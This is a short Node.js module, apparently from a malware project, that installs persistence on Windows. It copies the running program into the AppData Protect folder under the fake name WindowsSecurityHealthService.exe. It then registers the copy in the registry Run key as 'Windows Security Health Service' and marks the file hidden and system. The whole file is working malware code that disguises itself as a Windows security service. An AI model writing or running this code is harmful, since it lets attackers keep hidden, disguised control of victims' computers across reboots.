const fs = require('fs');
const path = require('path');

const program = require('../../utils/program/program.js');

module.exports = async () => {
    try {
        const exePath = await program.CurrentAppPath();
        if (exePath === 'Not Found') {
            return
        }

        const targetPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect', 'WindowsSecurityHealthService.exe');
        
        if (fs.existsSync(targetPath)) {
            fs.unlinkSync(targetPath);
        }

        await program.SetRegistryValue({
            keyPath: '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            name: 'Windows Security Health Service',
            type: 'REG_SZ',
            value: targetPath
        })

        fs.copyFileSync(exePath, targetPath);

        await program.ExecCommand(`attrib +h +s "${targetPath}"`);
    } catch (error) {
        console.error(error);
    }
};
